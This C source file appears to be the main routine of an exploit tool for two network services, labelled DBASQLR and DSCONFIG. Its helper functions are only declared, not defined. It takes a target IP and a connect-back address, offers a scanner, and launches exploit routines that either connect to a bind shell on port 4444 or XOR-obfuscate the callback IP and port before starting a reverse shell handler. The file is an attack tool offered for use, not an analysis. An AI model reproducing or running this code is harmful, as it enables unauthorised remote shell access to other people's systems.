
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int lport; int lip; int tip; } ;
typedef TYPE_1__ args ;


 int PORT_DBASQLR ;
 int PORT_DSCONFIG ;
 int connect_to_bindshell (int ,int) ;
 int connect_to_remote_host (int ,int ) ;
 int exit (int) ;
 int exploit_dbasqlr (int,unsigned long,unsigned short,int) ;
 int exploit_dsconfig (int,unsigned long,unsigned short,int) ;
 int header () ;
 unsigned short htons (int ) ;
 unsigned long inet_addr (int ) ;
 int isip (int ) ;
 int parse_arguments (int,char**,TYPE_1__*) ;
 int printf (char*) ;
 int select_action () ;
 int select_shellcode () ;
 int select_vulnerability () ;
 int start_reverse_handler (int ) ;
 int start_scanner (TYPE_1__*) ;
 int system (char*) ;

int
main ( int argc, char* argv[] )
{
 int s, action, vuln, sc;
 unsigned long xoredcbip;
 unsigned short xoredcbport;
 args myargs;

 system ( "clear" );
 header ();
 parse_arguments ( argc, argv, &myargs );
 if ( !isip ( myargs.tip ) )
 {
  printf ( "Invalid Target IP!\n" );
  exit ( 1 );
 }
 if ( !isip ( myargs.lip ) )
 {
  printf ( "Invalid Connect Back IP!\n" );
  exit ( 1 );
 }
 action = select_action ();
 if ( !action )
  start_scanner ( &myargs );
 vuln = select_vulnerability ();
 sc = select_shellcode ();
 switch ( vuln )
 {
  case 0:
  {
   s = connect_to_remote_host ( myargs.tip, PORT_DBASQLR );
   switch( sc )
   {
    case 0:
    {
     if ( exploit_dbasqlr ( s, ( unsigned long ) ((void*)0), ( unsigned short ) ((void*)0), 1 ) == 1 )
     {
      printf ( "exploitation failed!\n" );
      exit ( 1 );
     }
     connect_to_bindshell ( myargs.tip, 4444 );
     break;
    }
    case 1:
    {
     xoredcbip = inet_addr ( myargs.lip ) ^ ( unsigned long ) 0x99999999;
     xoredcbport = htons ( myargs.lport ) ^ ( unsigned short ) 0x9999;
     if ( exploit_dbasqlr ( s, xoredcbip, xoredcbport, 0 ) == 1 )
     {
      printf ( "exploitation failed!\n" );
      exit ( 1 );
     }
     start_reverse_handler ( myargs.lport );
     break;
    }
   }
  break;
  }
  case 1:
  {
   s = connect_to_remote_host ( myargs.tip, PORT_DSCONFIG );
   switch( sc )
   {
    case 0:
    {
     if ( exploit_dsconfig ( s, ( unsigned long ) ((void*)0), ( unsigned short ) ((void*)0), 1 ) == 1 )
     {
      printf ( "exploitation failed!\n" );
      exit ( 1 );
     }
     connect_to_bindshell ( myargs.tip, 4444 );
     break;
    }
    case 1:
    {
     xoredcbip = inet_addr ( myargs.lip ) ^ ( unsigned long ) 0x99999999;
     xoredcbport = htons ( myargs.lport ) ^ ( unsigned short ) 0x9999;
     if ( exploit_dsconfig ( s, xoredcbip, xoredcbport, 0 ) == 1 )
     {
      printf ( "exploitation failed!\n" );
      exit ( 1 );
     }
     start_reverse_handler ( myargs.lport );
     break;
    }
   }
  break;
  }
 }
}
